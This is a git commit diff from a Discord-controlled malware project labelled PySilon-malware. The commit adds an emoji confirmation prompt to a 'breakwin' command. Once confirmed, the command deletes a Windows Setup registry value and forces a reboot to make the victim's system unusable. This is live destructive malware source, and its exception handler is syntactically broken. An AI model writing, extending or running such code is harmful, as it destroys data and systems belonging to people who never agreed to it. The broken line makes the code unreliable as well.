ed03261e709a2ed103be49fae54535b9e28661b0
YawDev <nik.xeiladakis@gmail.com>
2024-07-15 19:49:00 +0300

    added confirmation by emoji reaction to break windows

--- resources/features/break_windows.py
+++ resources/features/break_windows.py
@@ -1,15 +1,26 @@
 import subprocess
+import asyncio
 
 @client.command(name='breakwin')
 async def break_windows(ctx):
     await ctx.message.delete()
     try:
         if IsAdmin():
-            subprocess.run(['reg', 'delete', 'HKLM\\SYSTEM\\Setup', '/v', 'SetupType', '/f'], check=True)
-            subprocess.run(['shutdown', '/r', '/f', '/t', '0'], check=True)
-            embed = discord.Embed(title="🟢 Success",description='Break windows has been successfully executed!',colour=discord.Colour.green())
+            embed = discord.Embed(title="🟣 System",description='Are you sure you want to completely break Windows?',colour=discord.Colour.purple())
             embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-            await ctx.send(embed=embed)
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('✅'); await reaction_msg.add_reaction('❌')
+            def win_break_confirm(reaction, user):
+                    return str(reaction.emoji) in ['✅', '❌'] and user == ctx.author
+            try:
+                reaction, user = await client.wait_for('reaction_add', check=win_break_confirm)
+                if str(reaction.emoji) == '✅':
+                    embed = discord.Embed(title="🟢 Executing",description='Break Windows will now be executed. Bye bye!',colour=discord.Colour.green())
+                    embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    await ctx.send(embed=embed)
+                    subprocess.run(['reg', 'delete', 'HKLM\\SYSTEM\\Setup', '/v', 'SetupType', '/f'], check=True)
+                    subprocess.run(['shutdown', '/r', '/f', '/t', '0'], check=True)
+                else: return await ctx.send("```❗ Cancelled by user.```")
+            except: asyncio.TimeoutError: await ctx.send("```❗ Reaction listener has timed out.```")
         else:
             embed = discord.Embed(title="📛 Error",description='Script is not running as admin!',colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
